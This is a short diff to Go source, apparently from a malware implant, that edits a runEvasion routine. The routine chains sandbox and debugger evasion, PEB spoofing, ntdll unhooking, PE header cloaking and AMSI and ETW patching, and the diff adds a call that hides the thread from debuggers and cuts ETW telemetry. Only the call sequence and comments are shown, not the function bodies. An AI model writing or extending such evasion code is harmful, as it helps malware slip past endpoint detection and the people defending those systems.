@@ -7,8 +7,9 @@ func runEvasion() {
 	exitIfWinPE()
 	evadeSandbox()
 	evadeDebugger()
-	spoofPEB()         // change visible process name/cmdline before any EDR check
-	unhookNtdll()      // clean NT stubs — must run before any NT-based patches
+	hideThreadFromDebugger() // kernel-level: hide thread from debugger attach + reduce ETW-TI
+	spoofPEB()               // change visible process name/cmdline before any EDR check
+	unhookNtdll()            // clean NT stubs — must run before any NT-based patches
 	cloakPEHeader()
 	patchAMSI()
 	patchETW()
